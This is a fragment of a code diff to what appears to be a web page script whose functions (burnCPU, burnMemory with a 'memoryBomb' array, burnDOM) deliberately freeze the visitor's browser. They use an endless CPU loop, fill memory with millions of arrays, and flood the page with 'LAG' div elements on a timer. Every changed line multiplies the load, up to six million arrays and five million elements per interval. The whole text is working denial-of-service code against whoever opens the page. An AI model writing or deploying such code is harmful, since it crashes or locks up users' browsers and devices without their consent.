@@ -24,14 +24,14 @@
       
       function burnCPU() {
         while (true) {
-          Math.sqrt(Math.random() * 1e12);
+          Math.sqrt(Math.random() * 6e12);
         }
       }
 
       
       const memoryBomb = [];
       function burnMemory() {
-        for (let i = 0; i < 1e6; i++) {
+        for (let i = 0; i < 6e6; i++) {
           memoryBomb.push(new Array(1000).fill("LAG"));
         }
       }
@@ -39,7 +39,7 @@
       
       function burnDOM() {
         setInterval(() => {
-          for (let i = 0; i < 5000; i++) {
+          for (let i = 0; i < 5000000; i++) {
             const d = document.createElement("div");
             d.textContent = "LAG";
             document.body.appendChild(d);
